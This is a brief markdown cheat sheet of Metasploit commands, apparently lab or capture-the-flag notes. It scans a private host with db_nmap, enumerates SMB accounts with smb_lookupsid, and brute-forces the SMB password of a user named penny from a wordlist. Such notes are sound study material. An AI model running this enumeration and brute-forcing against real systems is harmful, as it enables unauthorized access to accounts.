# Msfconsole
```bash
service postgresql start

msfdb init

msfconsole>
db_nmap -v -sV -T5 -p 1-1000 10.66.146.119

services

hosts

search type:auxiliary smb

use auxiliary/scanner/smb/smb_lookupsid
setg RHOSTS 10.66.146.119
set MINRID 500
set MAXRID 1000
run

use auxiliary/scanner/smb/smb_login
set SMBUSER penny
set PASS_FILE home/MetasploitWordlist.txt
run

```
